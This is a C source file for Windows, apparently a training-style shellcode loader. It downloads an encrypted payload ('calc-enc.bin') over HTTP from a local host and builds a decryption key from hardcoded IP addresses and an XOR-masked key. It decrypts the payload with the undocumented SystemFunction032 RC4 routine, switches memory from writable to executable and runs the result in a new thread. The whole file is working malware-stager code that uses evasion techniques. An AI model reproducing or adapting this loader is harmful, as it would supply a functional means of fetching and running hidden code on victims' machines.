#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winhttp.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")


typedef struct {
	DWORD Length;          
	DWORD MaximumLength;    
	PVOID Buffer;  
} USTRING, * PUSTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,
	struct USTRING* Key
	);


BOOL Rc4Enc(PBYTE pKey, PBYTE pData, DWORD dwKey, DWORD sData) {
	printf("Starting decryption!\n");
	NTSTATUS status = NULL;
	USTRING Key = {
		.Length = dwKey,
		.MaximumLength = dwKey,
		.Buffer = pKey
	};

	USTRING Data = {
		.Length = sData,
		.MaximumLength = sData,
		.Buffer = pData
	};

	fnSystemFunction032 sys032 = (fnSystemFunction032)(GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032"));

	status = sys032(&Data, &Key);
	if (status != 0x00) {
		printf("Encryption failed with status: %d\n", status);
		return FALSE;
	};
	printf("Decrypted shellcode!\n");
	return TRUE;
};


VOID XoRing(PBYTE pMessage, size_t sMsg_size, PBYTE key, size_t key_size) {
	for (size_t i = 0; i < sMsg_size; i++) {
		pMessage[i] = pMessage[i] ^ key[i % key_size];
	}
	printf("XoRing the encryption key!\n");
}


char* GenKeyFromIP(char ips[][15], size_t count) {
	static char buffer[50];
	buffer[0] = '\0';

	for (int i = 0; i < count; i++) {
		char* part = strtok((char*)ips[i], ".");
		while (part != NULL) {
			int octet = atoi(part);
			char hex[3];
			sprintf(hex, "%02X", octet);
			strcat(buffer, hex);
			part = strtok(NULL, ".");
		}
	}
	return buffer;
}


typedef struct {
	LPVOID data;
	DWORD size;
} Content;

Content Download(LPCWSTR url, LPCWSTR file) {
	
	// Create a HTTP session
	HINTERNET hSession = WinHttpOpen(
		NULL,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
		WINHTTP_NO_PROXY_NAME, 
		WINHTTP_NO_PROXY_BYPASS, 
		0
	);

	if (hSession) {
		// Connect to URL
		HINTERNET hConnect = WinHttpConnect(
			hSession,
			url,
			INTERNET_DEFAULT_HTTP_PORT,
			0
		);

		if (hConnect) {
			//Create a http request
			HINTERNET hRequest = WinHttpOpenRequest(
				hConnect,
				L"GET",
				file,
				NULL, 
				WINHTTP_NO_REFERER, 
				WINHTTP_DEFAULT_ACCEPT_TYPES, 
				0
			);
			// Send the request
			if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
				//Parse the response
				if (WinHttpReceiveResponse(hRequest, NULL)) {
					DWORD Size = 0;
					DWORD Downloaded = 0;
					LPSTR download_buffer;
					BOOL result = FALSE;

					do {
						Size = 0;
						if (!WinHttpQueryDataAvailable(hRequest, &Size)) {
							printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
						}

						download_buffer = (LPSTR)malloc(Size + 1);
						if (!download_buffer) {
							printf("Out of memory while downloading\n");
							Size = 0;
						}
						else {
							ZeroMemory(download_buffer, Size + 1);
							if (WinHttpReadData(hRequest, (LPVOID)download_buffer, Size, &Downloaded)) {
								// Content is in download_buffer
								Content downloaded = { .data = download_buffer, .size = Size};
								WinHttpCloseHandle(hRequest);
								WinHttpCloseHandle(hConnect);
								WinHttpCloseHandle(hSession);
								printf("Downloaded the shellcode!\n");
								return downloaded;
							}
						}
					} while (Size > 0);

				}
			WinHttpCloseHandle(hRequest);
			}
		WinHttpCloseHandle(hConnect);
		}
	WinHttpCloseHandle(hSession);
	}
	printf("Something failed!\n");
	Content temp = { .data = NULL, .size = 0};
	return temp;
}


PVOID prepare(char* sc, DWORD sc_size) {
	printf("Allocating memory!\n");
	PVOID addr = VirtualAlloc(NULL, sc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (addr == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return 1;
	}
	printf("Writing the shellcode to the allocated memory\n");
	memcpy(addr, sc, sc_size);
	memset(sc, '\0', sc_size);
	DWORD old = NULL;
	printf("Switching memory to RX!\n");
	if (!VirtualProtect(addr, sc_size, PAGE_EXECUTE_READ, &old)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return 1;
	}
	return addr;
}





int main() {
	char ips[][15] = {
		"192.168.100.52",
		"10.10.10.12",
		"172.16.132.123",
		"152.77.83.151"
	};

	char enc_key[] = { 0x4e,0x62,0x51,0x25,0x3a,0x53,0x4a,0x3b,0x5d,0x7b,0x6b,0x21,0x57,0x75,0x4b,0x72,0x3a,0x68,0x21,0x38,0x4a,0x25,0x34,0x40,0x46,0x58,0x61,0x79,0x4d,0x71,0x57,0x21,0x7d,0x62,0x56,0x5d,0x48,0x23,0x5d,0x4e,0x61,0x5d,0x32,0x71,0x45,0x69,0x5b,0x52,0x7d,0x61,0x4a,0x34,0x2f,0x2a,0x3a,0x45,0x35,0x32,0x25,0x2b,0x2c,0x69,0x54,0x00 };
	char* key = GenKeyFromIP(ips, sizeof(ips) / sizeof(ips[0]));


	Content pdata;
	LPCWSTR url = L"127.0.0.1";
	LPCWSTR file = L"calc-enc.bin";
	pdata = Download(url, file);


	char* sc = (char*)pdata.data;
	XoRing(enc_key, sizeof(enc_key), key, strlen(key));
	Rc4Enc(&enc_key, sc, sizeof(enc_key), pdata.size);


	PVOID scaddr = prepare(sc, pdata.size);
	
	printf("Creating execution thread!\n");
	HANDLE hThread = CreateThread(NULL, NULL, scaddr, NULL, NULL, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return 1;
	}
	WaitForSingleObject(hThread, INFINITE);
	
	printf("Freeing memory!\n");
	VirtualFree(scaddr, 0, MEM_RELEASE);
	
	printf("Cleaning ip!\n");
	free(pdata.data);
	pdata.size = 0;
	return 0;
}